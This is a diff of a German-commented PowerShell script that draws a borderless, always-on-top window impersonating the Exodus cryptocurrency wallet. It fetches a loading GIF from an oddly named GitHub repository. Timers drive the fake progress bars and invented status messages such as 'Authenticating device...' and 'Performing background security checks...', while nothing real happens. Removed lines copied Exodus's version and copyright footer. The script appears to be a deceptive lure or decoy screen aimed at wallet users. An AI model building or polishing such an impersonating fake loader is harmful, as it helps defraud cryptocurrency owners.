@@ -2,149 +2,205 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 [System.Windows.Forms.Application]::EnableVisualStyles()
 
-# Vollbild ohne Rahmen – sieht aus wie echte App
+# TLS 1.2 für GitHub
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+} catch {}
+
+# ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "Exodus"
-$form.WindowState = "Maximized"
-$form.FormBorderStyle = "None"          # Kein Rahmen
-$form.TopMost = $true
+$form.StartPosition = "CenterScreen"
+$form.Size = New-Object System.Drawing.Size(1200, 720)
+$form.FormBorderStyle = "None"
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+$form.ControlBox  = $false
+$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
+$form.ForeColor = [System.Drawing.Color]::White
 $form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
-$form.BackColor = [System.Drawing.Color]::FromArgb(18,18,26)  # Exodus Dark
-$form.ForeColor = "White"
+$form.TopMost = $true
 
-# ==================== EXODUS LOADING GIF (ONLINE) ====================
+# ==================== PRODUKTNAME EXODUS (OBEN) ====================
+$productLabel = New-Object System.Windows.Forms.Label
+$productLabel.Font = New-Object System.Drawing.Font(
+    "Segoe UI",
+    32,
+    [System.Drawing.FontStyle]::Bold
+)
+$productLabel.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF")  # Neonblau
+$productLabel.Dock = "Top"
+$productLabel.Height = 70
+$productLabel.TextAlign = "MiddleCenter"
+$productLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
+$productLabel.Text = "EXODUS"
+$form.Controls.Add($productLabel)
+
+# ==================== GIF (OBEN, unter Produktname, volle Breite) ====================
+$gifUrl  = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
+$gifPath = Join-Path $env:TEMP "exodus_loading.gif"
+
+try { (New-Object System.Net.WebClient).DownloadFile($gifUrl, $gifPath) } catch {}
+
 $pictureBox = New-Object System.Windows.Forms.PictureBox
-$pictureBox.SizeMode = "Zoom"
 $pictureBox.Dock = "Top"
-$pictureBox.Height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height / 2
+$pictureBox.Height = 260
+$pictureBox.SizeMode = "Zoom"
+$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
 
-# GIF direkt aus GitHub RAW laden
-$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
-try {
-    $webclient = New-Object System.Net.WebClient
-    $bytes = $webclient.DownloadData($gifUrl)
-    $stream = New-Object System.IO.MemoryStream($bytes)
-    $pictureBox.Image = [System.Drawing.Image]::FromStream($stream)
-} catch {
-    # Fallback: Textlogo
-    $logoLabel = New-Object System.Windows.Forms.Label
-    $logoLabel.Text = "EXODUS"
-    $logoLabel.Font = New-Object System.Drawing.Font("Arial Black", 72, [System.Drawing.FontStyle]::Bold)
-    $logoLabel.ForeColor = "#8B5CF6"
-    $logoLabel.Dock = "Top"
-    $logoLabel.TextAlign = "MiddleCenter"
-    $logoLabel.Height = 300
-    $form.Controls.Add($logoLabel)
+if (Test-Path $gifPath) {
+    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
 }
+
 $form.Controls.Add($pictureBox)
 
-# Loading-Text mit Punkten
+# ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
 $loadingLabel = New-Object System.Windows.Forms.Label
-$loadingLabel.Text = "Loading wallet"
-$loadingLabel.Font = New-Object System.Drawing.Font("Segoe UI", 28, [System.Drawing.FontStyle]::Regular)
+$loadingLabel.Font = New-Object System.Drawing.Font(
+    "Segoe UI",
+    30,
+    [System.Drawing.FontStyle]::Bold
+)
 $loadingLabel.ForeColor = "White"
 $loadingLabel.Dock = "Top"
 $loadingLabel.Height = 80
 $loadingLabel.TextAlign = "MiddleCenter"
+$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
 $form.Controls.Add($loadingLabel)
 
-# Haupt-Status
+# ===================== MODERNE FORTSCHRITTSBALKEN UNTEN =====================
+
+$progressBg = New-Object System.Windows.Forms.Panel
+$progressBg.Dock = "Bottom"
+$progressBg.Height = 14
+$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
+
+$progressBar = New-Object System.Windows.Forms.Panel
+$progressBar.Height = 14
+$progressBar.Width = 0
+$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
+$progressBg.Controls.Add($progressBar)
+
+$progressBg2 = New-Object System.Windows.Forms.Panel
+$progressBg2.Dock = "Bottom"
+$progressBg2.Height = 6
+$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
+
+$progressBar2 = New-Object System.Windows.Forms.Panel
+$progressBar2.Height = 6
+$progressBar2.Width = 50
+$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
+$progressBg2.Controls.Add($progressBar2)
+
+# ==================== STATUSLABEL UNTEN ÜBER DEN LADEBALKEN ====================
 $statusLabel = New-Object System.Windows.Forms.Label
-$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 18)
+$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
 $statusLabel.ForeColor = "#CCCCCC"
-$statusLabel.Dock = "Top"
-$statusLabel.Height = 60
+$statusLabel.Dock = "Bottom"                    # <– jetzt unten
+$statusLabel.Height = 40
 $statusLabel.TextAlign = "MiddleCenter"
-$statusLabel.Text = "Initializing..."
+$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
+
+# Reihenfolge bei Dock=Bottom ist wichtig:
+# Von unten nach oben: progressBg2 (ganz unten), progressBg, statusLabel (direkt darüber)
+$form.Controls.Add($progressBg2)
+$form.Controls.Add($progressBg)
 $form.Controls.Add($statusLabel)
 
-# Blockchain Sync Prozent
-$syncLabel = New-Object System.Windows.Forms.Label
-$syncLabel.Font = New-Object System.Drawing.Font("Segoe UI", 16)
-$syncLabel.ForeColor = "#AAAAAA"
-$syncLabel.Dock = "Top"
-$syncLabel.Height = 50
-$syncLabel.TextAlign = "MiddleCenter"
-$syncLabel.Text = "Syncing blockchain... 0%"
-$form.Controls.Add($syncLabel)
+# ===================== TIMER SETUP =====================
 
-# ProgressBar 1
-$progressSync = New-Object System.Windows.Forms.ProgressBar
-$progressSync.Style = "Continuous"
-$progressSync.ForeColor = "#8B5CF6"
-$progressSync.Dock = "Top"
-$progressSync.Height = 10
-$form.Controls.Add($progressSync)
+$marqueePos = 0
+$percent = 0
 
-# ProgressBar 2 (Marquee)
-$progressMarquee = New-Object System.Windows.Forms.ProgressBar
-$progressMarquee.Style = "Marquee"
-$progressMarquee.MarqueeAnimationSpeed = 30
-$progressMarquee.Dock = "Top"
-$progressMarquee.Height = 6
-$form.Controls.Add($progressMarquee)
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 50
 
-# Footer
-$footer = New-Object System.Windows.Forms.Label
-$footer.Text = "Exodus Version 25.1.17   © 2025 Exodus Movement, Inc."
-$footer.Font = New-Object System.Drawing.Font("Segoe UI", 11)
-$footer.ForeColor = "#555555"
-$footer.Dock = "Bottom"
-$footer.Height = 40
-$footer.TextAlign = "MiddleCenter"
-$form.Controls.Add($footer)
+$labelTimer = New-Object System.Windows.Forms.Timer
+$labelTimer.Interval = 3000
 
-# ==================== STATUS & PROGRESS LOGIK ====================
+# ===================== STATUS PHASEN =====================
+
+$authPhaseDuration = 15000      # 15 Sekunden
+$inAuthPhase = $true
+$authStartTime = Get-Date
+
+# Anfangstexte beim Start
+$loadingLabel.Text = "Authenticating device..."
+$statusLabel.Text  = "Performing background security checks..."
+
 $statuses = @(
-    "Initializing wallet...",
+    "Loading wallet...",
     "Connecting to secure servers...",
     "Decrypting local data...",
-    "Loading asset configurations...",
-    "Syncing Bitcoin network...",
-    "Syncing Ethereum network...",
-    "Syncing Solana network...",
-    "Fetching real-time prices...",
-    "Verifying transaction history...",
-    "Establishing encrypted connection...",
-    "Loading portfolio assets...",
+    "Fetching asset metadata...",
+    "Syncing blockchain nodes...",
     "Preparing secure environment...",
-    "Finalizing wallet data...",
+    "Loading portfolio assets...",
     "Almost there..."
 )
 
-$timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 3500
-
-$dotCount = 0
 $statusIndex = 0
-$percent = 0
+$dotCount = 0
+
+# ===================== Fortschritt / Balken Animation =====================
 
 $timer.Add_Tick({
-    # Punkte Animation
-    $dotCount = ($dotCount + 1) % 4
-    $dots = "." * $dotCount
-    $loadingLabel.Text = "Loading wallet$dots"
+    try {
+        if ($form.IsDisposed) { $timer.Stop(); return }
 
-    # Status ändern
-    if ((Get-Random -Minimum 1 -Maximum 10) -gt 5) {
-        $statusIndex = ($statusIndex + 1) % $statuses.Count
-        $statusLabel.Text = $statuses[$statusIndex]
-    }
-
-    # Prozent realistisch hochzählen
-    if ($percent -lt 99) {
-        $percent += Get-Random -Minimum 1 -Maximum 4
-        if ($percent -gt 99) { $percent = 99 }
-        $syncLabel.Text = "Syncing blockchain... $percent%"
-        $progressSync.Value = $percent
-    } elseif ($percent -eq 99) {
-        if ((Get-Random -Minimum 1 -Maximum 20) -eq 1) {
-            $sub = Get-Random -Minimum 1 -Maximum 8
-            $syncLabel.Text = "Syncing blockchain... 99.$sub%"
+        # Wenn die Authentifizierungsphase vorbei ist → Wechsel der Texte & Animation aktivieren
+        if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
+            $inAuthPhase = $false
+            $loadingLabel.Text = "Loading wallet"
+            $statusLabel.Text  = $statuses[0]
         }
+
+        # Marquee immer animieren
+        $marqueePos += 5
+        if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
+        $progressBar2.Left = $marqueePos
+
+        # In der Auth-Phase keine Prozentanzeige
+        if ($inAuthPhase) { return }
+
+        # Prozentbalken füllen
+        if ($percent -lt 100) {
+            $percent += 0.3
+            $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
+        }
+
+    } catch {
     }
 })
 
+# ===================== TEXT-ANIMATION =====================
+
+$labelTimer.Add_Tick({
+    try {
+        if ($form.IsDisposed) { $labelTimer.Stop(); return }
+
+        # Während Auth-Phase keine Punktanimation, kein Statuswechsel
+        if ($inAuthPhase) { return }
+
+        $dotCount = ($dotCount + 1) % 4
+        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)
+
+        $statusIndex = ($statusIndex + 1) % $statuses.Count
+        $statusLabel.Text = $statuses[$statusIndex]
+
+    } catch {
+    }
+})
+
+# ===================== CLEANUP =====================
+$form.Add_FormClosing({
+    $timer.Stop()
+    $labelTimer.Stop()
+})
+
 $timer.Start()
+$labelTimer.Start()
+
+$form.Add_Shown({ $form.Activate() })
 
 $form.ShowDialog() | Out-Null
